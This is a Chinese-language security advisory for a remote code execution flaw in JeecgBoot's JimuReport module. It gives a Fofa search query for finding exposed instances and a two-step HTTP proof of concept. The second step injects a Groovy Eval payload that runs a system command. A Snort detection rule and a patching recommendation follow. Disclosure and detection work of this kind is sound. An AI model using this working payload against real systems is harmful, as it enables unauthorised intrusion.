# JeecgBoot 积木报表远程代码执行漏洞(XVE-2026-53510)

JeecgBoot 积木报表远程代码执行漏洞(XVE-2026-53510)

# 影响版本

当前所有版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  app="JeecgBoot-企业级低代码平台"

**POC/EXP：**

**step1 文件上传**

```
GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10 HTTP/1.1
Host: 127.0.0.1:8004
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9


```

​![image](assets/image-20260831184931-hgoi351.png)​

**step2 查看上传后的文件**

```
POST /jeecg-boot/jmreport/auto/export HTTP/1.1
Host: 127.0.0.1:8004
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Content-Type: application/json
Accept: application/json

{
  "reportParams": [
    {
      "id": "907480464532770816",
      "params": {
        "x": "=use groovy.util.Eval; Eval.me('throw new RuntimeException(\"id\".execute().text)')"
      },
      "exportType": "pdf"
    }
  ]
}

```

​![image](assets/image-20260831185003-hl2g2ai.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"JeecgBoot 积木报表 - /jeecg-boot/jmreport/auto/export 远程代码执行漏洞 (Groovy注入)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/jeecg-boot/jmreport/auto/export"; fast_pattern;
    http.content_type; content:"application/json";
    http.request_body; content:"groovy.util.Eval"; nocase;
    http.request_body; content:"execute()"; distance:0; nocase;
    metadata:
        service http,
        affected_product "JeecgBoot 积木报表",
        vulnerability_type "Remote Code Execution (Groovy Injection)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000744;
    rev:1;
    priority:1;
)
```

# 漏洞修复

**尽快升级**：官方已发布安全补丁。

‍
